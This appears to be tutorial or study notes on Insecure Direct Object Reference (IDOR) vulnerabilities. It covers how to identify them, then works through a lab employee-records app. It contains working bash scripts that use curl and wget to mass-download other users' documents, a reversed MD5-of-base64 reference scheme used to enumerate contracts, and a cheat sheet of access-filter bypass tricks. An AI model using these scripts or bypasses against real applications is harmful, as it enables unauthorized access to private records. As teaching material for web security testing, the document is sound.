# 1. The basics

**Insecure Direct Object References (IDOR)** are common web vulnerabilities that occur when applications expose direct references to objects (files, database resources) that users can manipulate to access unauthorized resources. These vulnerabilities arise from inadequate access control systems and are difficult to detect through automated testing.

For example, if a file download link uses `download.php?file_id=123`, an attacker could potentially access other files by changing the ID to `download.php?file_id=124`. Without proper backend access controls, predictable IDs allow attackers to access resources beyond their permissions. The challenge of building robust access control systems makes IDOR vulnerabilities widespread and often undetected until production.

**What Makes an IDOR Vulnerability**

Direct object references alone aren't vulnerabilities - the real issue is weak access control systems. Many applications restrict access by limiting which pages or APIs users can reach, but fail to verify permissions on the backend when users access resources directly.
IDOR vulnerabilities exist primarily due to lack of backend access control. Without systems like Role-Based Access Control (RBAC) that compare user authentication against resource permissions, attackers can access or modify other users' data through direct object manipulation.
Many developers skip building proper access control, leaving applications protected only by frontend restrictions. This means all users potentially have backend access to all data - only the interface limits what they see. Manual HTTP request manipulation can reveal full data access, making IDOR attacks successful.

**Impact of IDOR Vulnerabilities**

IDOR vulnerabilities can have severe impacts on web applications:

**Information Disclosure**: The most common impact is unauthorized access to private user data like personal files or credit card information. Attackers identify direct references (database IDs, URL parameters) and test patterns to extract data from arbitrary users.

**Data Modification/Deletion**: Beyond viewing data, IDOR can allow attackers to modify or delete other users' information, potentially leading to complete account takeover.

**Privilege Escalation**: IDOR can enable standard users to gain administrator privileges through "Insecure Function Calls." Many applications expose admin-only APIs in frontend code but only disable them on the user interface. If backend systems don't explicitly restrict non-admin access to these functions, attackers can perform unauthorized administrative operations like changing passwords or granting roles, potentially leading to complete application takeover.

The combination of data exposure and potential administrative access makes IDOR vulnerabilities particularly dangerous for web application security.

## 1.2 - Identifying IDORs

### 1: URL Parameters & APIs

The first step in exploiting IDOR vulnerabilities is identifying Direct Object References. When accessing files or resources, examine HTTP requests for object references in URL parameters or APIs (e.g., `?uid=1` or `?filename=file_1.pdf`). These references can also appear in HTTP headers like cookies.

**Basic Testing**: Try incrementing object reference values (`?uid=2` or `?filename=file_2.pdf`) to access other data. Use fuzzing tools to test thousands of variations and identify successful hits to unauthorized files, which indicate IDOR vulnerabilities.

### 2: AJAX Calls

JavaScript frameworks sometimes insecurely expose all function calls in frontend code, using only appropriate ones based on user roles. Admin functions may be disabled but remain discoverable in the JavaScript code.

**Frontend Code Analysis**: Examine JavaScript code for AJAX calls containing direct object references to endpoints or APIs. These hidden functions may not appear through normal HTTP request monitoring but could be vulnerable to IDOR attacks.

**Example**:
```javascript
function changeUserPassword() {
    $.ajax({
        url:"change_password.php",
        type: "post",
        dataType: "json",
        data: {uid: user.uid, password: user.password, is_admin: is_admin},
        success:function(result){
            //
        }
    });
}
```

This function might never execute for non-admin users, but if found in frontend code, it can be tested for IDOR vulnerabilities by attempting to call it directly. The same approach applies to backend code when accessible (e.g., open-source applications).

### 3: Understand Hashing/Encoding

Applications may encode or hash object references instead of using sequential numbers, but these can still be exploitable without proper backend access control.

**Encoded References**: If references use common encoding like base64 (`?filename=ZmlsZV8xMjMucGRm`), decode to reveal the plaintext (`file_123.pdf`), modify the value (`file_124.pdf`), then re-encode (`?filename=ZmlsZV8xMjQucGRm`) to test for IDOR vulnerabilities.

**Hashed References**: References like `download.php?filename=c81e728d9d4c2f636f067f89cc14862c` may appear secure but could be vulnerable if you can determine the hashing method.

**Example**:
```javascript
$.ajax({
    url:"download.php",
    type: "post", 
    dataType: "json",
    data: {filename: CryptoJS.MD5('file_1.pdf').toString()},
    success:function(result){
        //
    }
});
```

Here, the filename is MD5 hashed, allowing you to calculate hashes for other files. Alternatively, use hash identifier tools to determine the algorithm, then hash different filenames to test access. Successfully downloading unauthorized files indicates an IDOR vulnerability.

### 4: Compare User Roles

Advanced IDOR attacks require registering multiple users to compare HTTP requests and object references. This helps understand how parameters and identifiers are calculated, enabling access to other users' data.

**Multi-User Testing**: If User1 can view their salary through this API call:

```json
{
  "attributes" : 
    {
      "type" : "salary",
      "url" : "/services/data/salaries/users/1"
    },
  "Id" : "1",
  "Name" : "User1"
}
```

User2 shouldn't have access to these parameters, but you can test by making the same API call while logged in as User2. If the application only requires a valid session without proper backend access control comparing the caller's session to the requested data, it may return unauthorized information.

**Vulnerability Identification**: Successfully accessing other users' data by replicating API calls indicates an IDOR vulnerability. Even if you can't calculate parameters for other users, identifying weak backend access control reveals potential exploitation paths through other object references.

# 2. Mass IDOR Enumeration

## 2.1 - Insecure Parameters

**Example:** In a Employee Manager web application that hosts employee records:

![image](https://github.com/user-attachments/assets/6e7f98c0-d120-48ca-876d-335444a89b87)

Our web application assumes that we are logged in as an employee with user id `uid=1` to simplify things. This would require us to log in with credentials in a real web application, but the rest of the attack would be the same. Once we click on `Documents`, we are redirected to `/documents.php`: `http://SERVER_IP:PORT/documents.php?uid=1`

![image](https://github.com/user-attachments/assets/41161e51-c30a-4007-8bc0-5b5d9458a8c0)

When we get to the `Documents` page, we see several documents that belong to our user. These can be files uploaded by our user or files set for us by another department (e.g., HR Department). Checking the file links, we see that they have individual names:

```
/documents/Invoice_1_09_2021.pdf
/documents/Report_1_10_2021.pdf
```

We see that the files have a predictable naming pattern, as the file names appear to be using the user `uid` and the month/year as part of the file name, which may allow us to fuzz files for other users. This is the most basic type of IDOR vulnerability and is called `static file IDOR`. However, to successfully fuzz other files, we would assume that they all start with `Invoice` or `Report`, which may reveal some files but not all

We see that the page is setting our `uid` with a `GET` parameter in the URL as (`documents.php?uid=1`). If the web application uses this `uid` GET parameter as a direct reference to the employee records it should show, we may be able to view other employees' documents by simply changing this value. If the back-end end of the web application `does` have a proper access control system, we will get some form of `Access Denied`. However, given that the web application passes as our `uid` in clear text as a direct reference, this may indicate poor web application design, leading to arbitrary access to employee records.

When we try changing the `uid` to `?uid=2`, we don't notice any difference in the page output, as we are still getting the same list of documents, and may assume that it still returns our own documents:

![image](https://github.com/user-attachments/assets/a165de9b-cfdf-4545-801d-9a29f42bf7ef)

However, `we must be attentive to the page details during any web pentest` and always keep an eye on the source code and page size. If we look at the linked files, or if we click on them to view them, we will notice that these are indeed different files, which appear to be the documents belonging to the employee with `uid=2`:

```
/documents/Invoice_2_08_2020.pdf
/documents/Report_2_12_2020.pdf
```

This is a common mistake found in web applications suffering from IDOR vulnerabilities, as they place the parameter that controls which user documents to show under our control while having no access control system on the back-end. Another example is using a filter parameter to only display a specific user's documents (e.g. `uid_filter=1`), which can also be manipulated to show other users' documents or even completely removed to show all documents at once.

## 2.2 - Mass Enumeration

We can try manually accessing other employee documents with `uid=3`, `uid=4`, and so on. However, manually accessing files is not efficient in a real work environment with hundreds or thousands of employees. So, we can either use a tool like `Burp Intruder` or `ZAP Fuzzer` to retrieve all files or write a small bash script to download all files.

**Simple script to download all files:**

First, `inspect` the web:

```
<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
<li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>
```

Then, `curl` with `grep` option to trim the response:

```
$ curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep "<li class='pure-tree_link'>"

<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
<li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>

$ curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"

/documents/Invoice_3_06_2020.pdf
/documents/Report_3_01_2020.pdf
```

Now, we can use a simple `for` loop to loop over the `uid` parameter and return the document of all employees, and then use `wget` to download each document link:

```bash
#!/bin/bash

url="http://SERVER_IP:PORT"

for i in {1..10}; do
        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
                wget -q $url/$link
        done
done
```

When we run the script, it will download all documents from all employees with `uids` between 1-10, thus successfully exploiting the IDOR vulnerability to mass enumerate the documents of all employees. This script is one example of how we can achieve the same objective. Try using a tool like Burp Intruder or ZAP Fuzzer, or write another Bash or PowerShell script to download all documents.


# 3. Bypassing Encoded References

## 3.1 - Context

In the previous section, we saw an example of an IDOR that uses employee uids in clear text, making it easy to enumerate. In some cases, web applications make `hashes` or `encode` their `object` references, making enumeration more difficult, but it may still be possible.

In the Employee Manager web application to test the Contracts functionality:

![image](https://github.com/user-attachments/assets/93f71c9c-b758-4fd5-893f-becd325799ff)

If we click on the `Employment_contract.pdf` file, it starts downloading the file. The intercepted request in Burp looks as follows:

![image](https://github.com/user-attachments/assets/a0c22218-681a-4935-90fe-d7d35393e8a4)

We see that it is sending a `POST` request to `download.php` with the following data: `contract=cdd96d3cc73d1dbdaffa03cc6cd7339b`

Using a `download.php` script to download files is a common practice to avoid directly linking to files, as that may be exploitable with multiple web attacks. In this case, the web application is not sending the direct reference in cleartext but appears to be hashing it in an `md5` format. Hashes are one-way functions, so we cannot decode them to see their original values.

We can attempt to hash various values, like `uid`, `username`, `filename`, and many others, and see if any of their `md5` hashes match the above value. If we find a match, then we can replicate it for other users and collect their files. For example, let's try to compare the `md5` hash of our `uid`, and see if it matches the above hash:

```
$ echo -n 1 | md5sum

c4ca4238a0b923820dcc509a6f75849b -
```

Unfortunately, the hashes do not match. We can attempt this with various other fields, but none of them matches our hash. In advanced cases, we may also utilize `Burp Comparer` and fuzz various values and then compare each to our hash to see if we find any matches. In this case, the `md5` hash could be for a unique value or a combination of values, which would be very difficult to predict, making this direct reference a `Secure Direct Object Reference`. 

**Note:** 
> - Also, try `crackstation`, `cyberchef`, ...

## 3.2 - Function Disclosure

Modern web applications using JavaScript frameworks like `Angular`, `React`, or `Vue.js` often mistakenly perform sensitive functions on the front-end, exposing them to attackers. If hash calculations occur client-side, attackers can study and replicate the function. This web application demonstrates exactly this vulnerability.

If we take a look at the link in the source code, we see that it is calling a JavaScript function with `javascript:downloadContract('1')`. Looking at the `downloadContract()` function in the source code, we see the following:

```
function downloadContract(uid) {
    $.redirect("/download.php", {
        contract: CryptoJS.MD5(btoa(uid)).toString(),
    }, "POST", "_self");
}
```

This function sends a POST request with a `contract` parameter containing an MD5 hash generated by CryptoJS. The hashed value is `btoa(uid)` - the base64-encoded `uid` input argument. Since the function is called with `downloadContract('1')`, the POST request uses the MD5 hash of the base64-encoded string "1".

We can test this by `base64` encoding our `uid=1`, and then hashing it with `md5`, as follows:

```
$ echo -n 1 | base64 -w 0 | md5sum

cdd96d3cc73d1dbdaffa03cc6cd7339b -
```

**Note:**
> - We are using the `-n` flag with `echo`, and the `-w 0` flag with `base64`, to avoid adding newlines, in order to be able to calculate the `md5` hash of the same value, without hashing newlines, as that would change the final `md5` hash.

As we can see, this hash matches the hash in our request, meaning that we have successfully reversed the hashing technique used on the object references, turning them into IDOR's. With that, we can begin enumerating other employees' contracts using the same hashing method we used above.


## 3.3 - Mass Enumeration

Now we can try to write a script similar to what we used in the previous section to enumerate all contracts.

More often than not, this is the easiest and most efficient method of enumerating data and files through IDOR vulnerabilities. In more advanced cases, we may utilize tools like `Burp Intruder` or `ZAP Fuzzer`, but a simple bash script should be the best in this case.

We can start by calculating the hash for each of the first ten employees using the same previous command while using tr -d to remove the trailing - characters, as follows:

```
$ for i in {1..10}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done

cdd96d3cc73d1dbdaffa03cc6cd7339b
0b7e7dee87b1c3b98e72131173dfbbbf
0b24df25fe628797b3a50ae0724d2730
f7947d50da7a043693a592b4db43b0a1
8b9af1f7f76daf0f02bd9c48c4a2e3d0
006d1236aee3f92b8322299796ba1989
b523ff8d1ced96cef9c86492e790c2fb
d477819d240e7d3dd9499ed8d23e7158
3e57e65a34ffcb2e93cb545d024f5bde
5d4aace023dc088767b4e08c79415dcd
```

Next, we can make a `POST` request on `download.php` with each of the above hashes as the `contract` value, which should give us our final script:

```bash
#!/bin/bash

for i in {1..10}; do
    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
        curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
    done
done
```

With that, we can run the script, and it should download all contracts for employees 1-10:

# Cheat sheet

Stuff to look for in IDOR:
> - infor disclossure: `robots.txt`, `source code`, ...
> - Parameter: `cookies`, `additional function`, ...
> - Also parameter in `body` of the REQUEST.
> - Test with different `methods` GET, POST, PUT, ...
> - If there's `filter`: `what's it block`, if block `method` = use a different one, if block `URL` = use `HEADER`: `X-Original-URL` and `X-Rewrite-URL`.
> - Check: `url parameter` and how its `used`, `redirect`, `file names when GET or when download`, ...
> - If theres `multi-step processes`: check every step, `especially last step`.
